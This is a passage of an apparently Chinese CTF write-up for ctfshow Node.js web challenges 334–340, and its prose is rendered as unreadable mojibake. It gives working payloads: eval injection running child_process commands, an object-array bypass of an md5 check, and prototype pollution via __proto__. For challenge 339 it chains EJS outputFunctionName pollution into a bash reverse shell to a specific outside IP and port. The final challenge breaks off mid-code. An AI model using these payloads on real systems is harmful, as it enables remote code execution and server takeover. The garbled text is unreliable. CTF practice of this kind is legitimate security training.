class="token string">'builds/pdf/book.html'</span><span class="token punctuation">,</span>  <span class="token string">'-o'</span><span class="token punctuation">,</span> <span class="token string">'builds/pdf/book.pdf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>child<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">chunk</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// output will be here in chunks</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// or if you want to send output elsewhere</span>child<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœä½ æƒ³åœ¨nodejsé‡Œæ‰§è¡Œçš„æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªç®€å•çš„å‘½ä»¤ï¼Œé‚£ä½ å°±éœ€è¦ä½¿ç”¨<code>child_process.execFile</code>ï¼Œè¿™ä¸ªæ–¹æ³•çš„å‚æ•°å‡ ä¹å’Œ<code>spawn</code>ä¸€æ ·ï¼Œåªæ˜¯å¤šäº†ç¬¬å››ä¸ªå›è°ƒå‡½æ•°å‚æ•°ï¼Œå’Œ<code>exec</code>é‡Œçš„å›è°ƒå‡½æ•°å‚æ•°ä¸€æ ·ï¼š</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> execFile <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>execFile<span class="token punctuation">;</span><span class="token function">execFile</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> args<span class="token punctuation">,</span> options<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// command output is in stdout</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šé¢çš„è¿™äº›æ–¹æ³•åœ¨nodejsé‡Œéƒ½æ˜¯å¼‚æ­¥æ‰§è¡Œçš„ï¼Œåˆ°ä½†æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦åŒæ­¥æ‰§è¡Œä¸€äº›ä»»åŠ¡ï¼Œä¸‹é¢çš„ä¸€äº›ä»£ç ä¾‹å­æ˜¯ä½¿ç”¨åŒæ­¥çš„æ–¹æ³•è°ƒç”¨ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œä»»åŠ¡ï¼š</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token string">'use strict'</span><span class="token punctuation">;</span><span class="token keyword">const</span>    spawn <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span> <span class="token string">'child_process'</span> <span class="token punctuation">)</span><span class="token punctuation">.</span>spawnSync<span class="token punctuation">,</span>    ls <span class="token operator">=</span> <span class="token function">spawn</span><span class="token punctuation">(</span> <span class="token string">'ls'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token string">'-lh'</span><span class="token punctuation">,</span> <span class="token string">'/usr'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">stderr: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>ls<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">stdout: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>ls<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> execSync <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>execSync<span class="token punctuation">;</span><span class="token keyword">var</span> cmd <span class="token operator">=</span> <span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'prince -v builds/pdf/book.html -o builds/pdf/book.pdf'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç®€å•æ¥è¯´ï¼Œè°ƒç”¨ç³»ç»Ÿå‘½ä»¤ä¼ å…¥çš„æ–¹æ³•æ˜¯</p><p>åœ¨JSONè§£æçš„æƒ…å†µä¸‹ï¼Œ<code>__proto__</code>ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†object2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚</p><p><strong>334</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥å°å†™å°±è¡Œ<code>ctfshow+123456</code></p><p><strong>335</strong></p><p>çœ‹æºä»£ç å‘ç°evalå‚æ•°ï¼Œå°è¯•ä¼ å…¥lså›æ˜¾æœªæ‰¾åˆ°æ–‡ä»¶ï¼Œä¼ å…¥1+1å›æ˜¾2ï¼Œæ€€ç–‘æ‰§è¡Œäº†nodejsä¸­çš„evalå‡½æ•°</p><blockquote><p>åœ¨nodejsä¸­ï¼Œeval()æ–¹æ³•ç”¨äºè®¡ç®—å­—ç¬¦ä¸²ï¼Œå¹¶æŠŠå®ƒä½œä¸ºè„šæœ¬ä»£ç æ¥æ‰§è¡Œï¼Œè¯­æ³•ä¸ºâ€œeval(string)â€ï¼›å¦‚æœå‚æ•°ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯æ•´æ•°æˆ–è€…æ˜¯Functionç±»å‹ï¼Œåˆ™ç›´æ¥è¿”å›è¯¥æ•´æ•°æˆ–Functionã€‚</p></blockquote><p>æ„é€ ä¸€ä¸ªç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„payload</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°æ–‡ä»¶åç›´æ¥catå°±è¡Œ</p><p><strong>336</strong></p><p>åŒä¸Šé¢˜ä¸è¿‡å¢åŠ äº†è¿‡æ»¤</p><p>æ¢ä¸€ä¸ªæ–¹æ³•</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>337</strong></p><p>æºç åœ¨æ­¤</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'xxxxxxx'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> a <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">;</span>  <span class="token keyword">var</span> b <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>b<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¦æ±‚å°±æ˜¯ä¼ å…¥çš„abé•¿åº¦ç›¸ç­‰ï¼Œå†…å®¹ä¸æƒ³ç­‰ï¼ŒåŠ ä¸Šflagå­—ç¬¦ä¸²å˜é‡åmd5è¿ç®—çš„ç»“æœç›¸åŒ</p><blockquote><p>åœ¨javascriptä¸­åŠ æ³•çš„è§„åˆ™å¾ˆç®€å•ï¼Œåªèƒ½æ•°å­—ä¸æ•°å­—ç›¸åŠ æˆ–å­—ç¬¦ä¸²å’Œå­—ç¬¦ä¸²ç›¸åŠ ï¼›æ‰€æœ‰å…¶ä»–ç±»å‹çš„å€¼éƒ½ä¼šè‡ªåŠ¨è½¬æ¢æˆè¿™ä¸¤ä¸ªç±»å‹çš„å€¼ã€‚è€Œå¯¹è±¡ç±»å‹ç»è¿‡toStringè½¬æ¢åç»“æœä¸º[object Object]å­—ç¬¦ä¸²</p></blockquote><p>æ‰€ä»¥æœ€ç»ˆä¼ å…¥ä¸¤ä¸ªæ•°ç»„å³å¯</p><pre class="line-numbers language-none"><code class="language-none">payload:?a[x]&#x3D;1&amp;b[x]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸ºå•¥æ•°ç»„çš„é”®å€¼ä¸èƒ½æ˜¯æ•°å­—</p><pre class="line-numbers language-none"><code class="language-none">a&#x3D;&#123;&#39;x&#39;:&#39;1&#39;&#125;b&#x3D;&#123;&#39;x&#39;:&#39;2&#39;&#125;console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)äºŒè€…å¾—å‡ºçš„ç»“æœéƒ½æ˜¯[object Object]flag&#123;xxx&#125;ï¼Œæ‰€ä»¥md5å€¼ä¹Ÿç›¸åŒä½†æ˜¯å¦‚æœä¼ a[0]&#x3D;1&amp;b[0]&#x3D;2ï¼Œç›¸å½“äºåˆ›äº†ä¸ªå˜é‡a&#x3D;[1] b&#x3D;[2]ï¼Œå†åƒä¸Šé¢é‚£æ ·æ‰“å°çš„æ—¶å€™ï¼Œä¼šæ‰“å°å‡º1flag&#123;xxx&#125;å’Œ2flag&#123;xxx&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>338</strong></p><p>åŸå‹é“¾æ±¡æŸ“</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//login.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span><span class="token string">'36dboy'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'ç™»å½•å¤±è´¥'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>utils.copy(user,req.body);</code>è¿™ä¸ªå’Œmergeå·®ä¸å¤š</p><pre class="line-numbers language-none"><code class="language-none">payload:POST&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>339</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//login.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">normalUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">&#125;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'ç™»å½•å¤±è´¥'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™è¦è®©ctfshow=flagå˜é‡ï¼Œæˆ‘ä¸è¡Œæï¼Œçœ‹çœ‹æ—è¾¹çš„app.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//api.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'api'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">query</span><span class="token operator">:</span> <span class="token function">Function</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Function(â€œconsole.log(â€˜HelloWolrdâ€™)â€)()</li></ul><p>ç±»ä¼¼äºphpä¸­çš„create_function</p><p>å¯¹äºejsæ¸²æŸ“å¼•æ“æ¥è¯´ï¼Œå¯¹optsæœ‰åŸå‹é“¾æ±¡æŸ“æ¼æ´</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        prepended <span class="token operator">+=</span> <span class="token string">'  var '</span> <span class="token operator">+</span> opts<span class="token punctuation">.</span>outputFunctionName <span class="token operator">+</span> <span class="token string">' = __append;'</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥æ±¡æŸ“outputFunctionNameæ¥æ‰§è¡Œæ¶æ„ä»£ç </p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span><span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">"outputFunctionName"</span><span class="token operator">:</span><span class="token string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >&amp; /dev/tcp/45.15.131.101/2337 0>&amp;1\"');var __tmp2"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é€šè¿‡loginæ±¡æŸ“å†é€šè¿‡apiæ¸²æŸ“è°ƒç”¨</p><p><strong>340</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>userinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isVIP <span class="token operator">=</span> <span class="token 